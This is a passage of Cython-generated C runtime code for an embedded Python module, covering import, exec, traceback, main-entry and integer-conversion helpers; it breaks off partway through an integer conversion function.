#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* PyExecGlobals */
static PyObject* __Pyx_PyExecGlobals(PyObject* code) {
    PyObject* result;
    PyObject* globals = __Pyx_Globals();
    if (unlikely(!globals))
        return NULL;
    result = __Pyx_PyExec2(code, globals);
    Py_DECREF(globals);
    return result;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
